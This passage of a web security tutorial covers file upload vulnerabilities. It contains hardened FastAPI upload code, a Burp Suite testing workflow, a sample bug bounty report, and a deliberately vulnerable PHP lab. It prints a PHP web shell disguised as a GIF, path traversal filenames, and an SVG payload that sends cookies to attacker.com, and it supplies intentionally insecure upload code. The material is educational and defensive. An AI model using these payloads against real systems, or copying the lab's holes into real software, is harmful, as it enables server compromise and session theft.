        # Re-open after verify (verify closes the file)
        img = Image.open(BytesIO(content))

        # Strip all metadata and re-encode
        output = BytesIO()
        img = img.convert("RGB")  # Remove alpha channel, normalize
        img.save(output, format="JPEG", quality=85)
        return output.getvalue()
    except Exception as e:
        raise HTTPException(status_code=400, detail="Invalid image data")


@app.post("/upload")
async def upload_file(file: UploadFile = File(...)):
    # Read file content with size limit
    content = await file.read()
    if len(content) > MAX_FILE_SIZE:
        raise HTTPException(status_code=400, detail="File too large")
    if len(content) == 0:
        raise HTTPException(status_code=400, detail="Empty file")

    # Validate extension (defense in depth)
    original_ext = Path(file.filename or "").suffix.lower()
    if original_ext not in ALLOWED_EXTENSIONS:
        raise HTTPException(status_code=400, detail="Invalid extension")

    # Check for path traversal in filename
    if file.filename and (".." in file.filename or "/" in file.filename or "\\" in file.filename):
        raise HTTPException(status_code=400, detail="Invalid filename")

    # Validate actual file content
    detected_mime = validate_file_content(content)

    # Sanitize the image (re-encode to strip payloads)
    sanitized_content = sanitize_image(content)

    # Generate secure random filename
    safe_name = secrets.token_hex(16) + ".jpg"
    file_path = UPLOAD_DIR / safe_name

    # Verify resolved path is within upload directory
    if not str(file_path.resolve()).startswith(str(UPLOAD_DIR.resolve())):
        raise HTTPException(status_code=400, detail="Path traversal detected")

    # Write sanitized content
    with open(file_path, "wb") as f:
        f.write(sanitized_content)

    return {
        "file_id": safe_name.replace(".jpg", ""),
        "message": "Upload successful"
    }


@app.get("/files/{file_id}")
async def get_file(file_id: str):
    # Strict input validation: only hex characters
    if not all(c in "0123456789abcdef" for c in file_id):
        raise HTTPException(status_code=400, detail="Invalid file ID")

    file_path = UPLOAD_DIR / f"{file_id}.jpg"

    if not file_path.exists():
        raise HTTPException(status_code=404, detail="File not found")

    return FileResponse(
        path=str(file_path),
        media_type="image/jpeg",
        headers={
            "X-Content-Type-Options": "nosniff",
            "Content-Disposition": 'inline; filename="image.jpg"',
            "Content-Security-Policy": "default-src 'none'",
            "Cache-Control": "public, max-age=86400"
        }
    )
```

---

## Burp Suite Workflow for File Upload Testing

### Step 1: Baseline Upload

Upload a legitimate file and capture the request in Burp Proxy. Note the request structure, parameter names, boundary format, and response.

### Step 2: Extension Testing

Send the captured request to Burp Repeater. Systematically modify the filename:

```
Original:   filename="photo.jpg"
Test 1:     filename="photo.php"
Test 2:     filename="photo.php.jpg"
Test 3:     filename="photo.pHp"
Test 4:     filename="photo.php5"
Test 5:     filename="photo.phtml"
Test 6:     filename="photo.php%00.jpg"
Test 7:     filename="photo.jpg.php"
Test 8:     filename="photo.shtml"
Test 9:     filename="photo.asp"
Test 10:    filename="photo.aspx"
Test 11:    filename="photo.jsp"
Test 12:    filename="photo.svg"
Test 13:    filename=".htaccess"
```

Record which extensions are accepted and which are rejected.

### Step 3: MIME Type Testing

For extensions that were rejected, change the Content-Type header to an allowed value:

```
Content-Type: image/jpeg         (for .php with JPEG content type)
Content-Type: image/png          (for .asp with PNG content type)
Content-Type: application/pdf    (if PDFs are allowed)
```

### Step 4: Content Manipulation

Replace the file body with web shell payloads while keeping the extension and Content-Type as "valid":

```
----boundary
Content-Disposition: form-data; name="file"; filename="photo.jpg"
Content-Type: image/jpeg

GIF89a;
<?php system($_GET['cmd']); ?>
----boundary--
```

The `GIF89a;` prefix makes it pass magic byte checks for GIF.

### Step 5: Path Traversal

Modify the filename to include traversal sequences:

```
filename="../../shell.php"
filename="..%2f..%2fshell.php"
filename="....//....//shell.php"
filename="%2e%2e%2f%2e%2e%2fshell.php"
```

### Step 6: Intruder for Race Conditions

1. Configure Burp Intruder with the upload request
2. Set payload type to "Null payloads" with a high count (500+)
3. Set thread count high (20+ concurrent)
4. Simultaneously, configure a second Intruder instance to send GET requests to the expected upload path
5. Run both simultaneously and check for successful execution responses

### Step 7: Response Analysis

For every successful upload, check:
- Does the response include the file URL?
- Can you access the uploaded file directly?
- Does the server set proper Content-Type headers when serving the file?
- Is `X-Content-Type-Options: nosniff` present?
- Can the file be accessed without authentication?

### Automated Burp Extension Approach

Use the Upload Scanner Burp extension (BApp Store) which automates many of these tests, including polyglot generation and extension permutation.

---

## Common Developer Mistakes Summary

| Mistake | Impact | Fix |
|---------|--------|-----|
| Checking only file extension | Web shell upload | Validate magic bytes + re-encode |
| Trusting client MIME type | Any file type upload | Use `file-type` / `python-magic` |
| Using original filename | Path traversal, overwrite | Generate random filename server-side |
| Storing in web root | Direct execution of uploads | Store outside web root or on S3 |
| No file size limit | DoS via disk exhaustion | Enforce limits at app + proxy level |
| Client-side only validation | Complete bypass | All checks must be server-side |
| Static file serving for uploads | Execute uploaded scripts | Serve through controlled endpoint |
| No content re-encoding | Polyglot, EXIF payloads | Re-encode all images with Sharp/Pillow |
| Using ImageMagick defaults | RCE via ImageTragick | Restrict policy.xml or use libvips |
| Presigned URL without constraints | Arbitrary upload to S3 | Use presigned POST with conditions |

---

## Bug Bounty Report Example

**Title:** Unrestricted File Upload Leading to Stored XSS via SVG and Potential RCE via Path Traversal

**Severity:** Critical (CVSS 9.1)

**Affected Endpoint:** `POST /api/v2/profile/avatar`

**Summary:**

The avatar upload endpoint at `/api/v2/profile/avatar` accepts SVG files without content sanitization and uses the original filename for storage. This allows: (1) Stored XSS by uploading an SVG containing JavaScript, which executes in the context of `app.target.com` when any user views the attacker's profile. (2) Path traversal by including `../` sequences in the filename, enabling file writes outside the intended upload directory.

**Steps to Reproduce:**

1. Authenticate as any user.
2. Intercept the avatar upload request in Burp Suite.
3. Replace the file content with:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.com/steal?c='+document.cookie)">
  <rect width="100" height="100"/>
</svg>
```

4. Set the filename to `payload.svg`.
5. Submit the request. Response:

```json
{
  "avatar_url": "/uploads/avatars/payload.svg"
}
```

6. Navigate to `https://app.target.com/uploads/avatars/payload.svg` -- JavaScript executes.
7. Any user viewing the attacker's profile triggers the XSS because the avatar is loaded inline.

**Path Traversal PoC:**

1. Change the filename to `../../../var/www/html/test.html`.
2. Set the content to `<h1>Path Traversal PoC</h1>`.
3. Upload. Access `https://target.com/test.html` to confirm the file was written outside the upload directory.

**Impact:**

- **Stored XSS:** Session hijacking, account takeover for any user who views the attacker's profile. This includes admin users.
- **Path traversal:** Arbitrary file write on the server. Combined with the ability to control file content, this could lead to RCE by overwriting application code or placing a web shell in the web root.

**Recommendation:**

1. Reject SVG uploads or sanitize SVG content server-side using DOMPurify.
2. Generate random filenames server-side; never use the original filename.
3. Store uploads outside the web root.
4. Serve uploaded files with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`.
5. Validate file content using magic bytes, not the declared MIME type.

---

## Severity Explanation

File upload vulnerabilities range from **Medium** to **Critical** depending on what the attacker achieves:

- **Medium (4.0-6.9):** Stored XSS via SVG uploads, information disclosure through EXIF data.
- **High (7.0-8.9):** Arbitrary file write (path traversal) without code execution, denial of service via disk exhaustion, overwriting application configuration.
- **Critical (9.0-10.0):** Remote code execution via web shell upload, arbitrary file overwrite leading to RCE, SSRF chain from ImageMagick processing uploaded files, full filesystem read via ImageMagick CVEs.

The severity escalates based on what the uploaded content can do and where it ends up. A web shell in the web root of a server running PHP is an instant critical. An SVG XSS on a subdomain that shares cookies with the main app is high to critical depending on what those cookies protect.

---

## Lab Setup Ideas

### Docker Lab: Vulnerable Upload Server

```dockerfile
FROM php:8.0-apache

# Enable PHP in the uploads directory (intentionally vulnerable)
RUN echo "AddType application/x-httpd-php .php .phtml .php5" >> /etc/apache2/apache2.conf

# Create upload directory inside web root
RUN mkdir -p /var/www/html/uploads && chmod 777 /var/www/html/uploads

COPY index.php /var/www/html/index.php
COPY upload.php /var/www/html/upload.php

EXPOSE 80
```

**upload.php (intentionally vulnerable):**

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $target_dir = "uploads/";
    $target_file = $target_dir . basename($_FILES["file"]["name"]);

    // Vulnerable checks
    $check = getimagesize($_FILES["file"]["tmp_name"]);
    $allowed_types = array("image/jpeg", "image/png", "image/gif", "image/svg+xml");

    if (in_array($_FILES["file"]["type"], $allowed_types)) {
        if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
            echo json_encode(["status" => "success", "url" => $target_file]);
        } else {
            echo json_encode(["status" => "error", "message" => "Upload failed"]);
        }
    } else {
        echo json_encode(["status" => "error", "message" => "Invalid type"]);
    }
}
?>
```

### Lab Exercises

1. **SVG XSS:** Upload an SVG with JavaScript. Verify it executes when accessed.
2. **MIME bypass:** Upload a PHP shell with `Content-Type: image/jpeg`.
3. **Double extension:** Upload `shell.php.jpg` and test if Apache executes it.
4. **Polyglot:** Create a GIF/PHP polyglot that passes `getimagesize()` and executes as PHP.
5. **Path traversal:** Upload a file with `../` in the name and verify it lands outside the uploads directory.
6. **Race condition:** Write a script that uploads and accesses a file simultaneously.
7. **ImageMagick:** If the lab includes ImageMagick for resizing, test ImageTragick payloads.

### Recommended Platforms

- **PortSwigger Web Security Academy:** File upload labs with guided solutions
- **DVWA (Damn Vulnerable Web Application):** File upload module with multiple difficulty levels
- **HackTheBox:** Multiple machines with file upload as the initial exploitation vector
- **TryHackMe:** Dedicated file upload vulnerability rooms

---

## Conclusion

File upload security is not a single check. It is a layered defense that must cover the filename, the content type, the file content, the storage location, the processing pipeline, and the serving mechanism. Every layer that you skip is a potential bypass path.

The core principles:

1. **Never trust anything from the client.** Not the filename, not the MIME type, not the extension.
2. **Validate the actual content.** Use magic byte detection, not string matching.
3. **Re-encode images.** Do not just validate them. Destroy any embedded payloads by creating a new image from the pixel data.
4. **Store outside the web root.** Uploaded files must never be directly executable by the web server.
5. **Generate random filenames server-side.** Eliminate path traversal and predictable URL attacks.
6. **Serve with strict headers.** `X-Content-Type-Options: nosniff`, proper `Content-Type`, `Content-Disposition` where appropriate.
7. **Use a separate domain for user content.** Isolate the blast radius of any XSS.

If you implement all seven of these principles, you eliminate the vast majority of file upload attack surface. Skip any one of them, and you are exposed.

Test every upload endpoint in your scope with the Burp Suite workflow described above. File upload bugs remain some of the highest-paying vulnerabilities in bug bounty programs because they so often lead to RCE, and developers continue to underestimate how many ways a file can be weaponized.
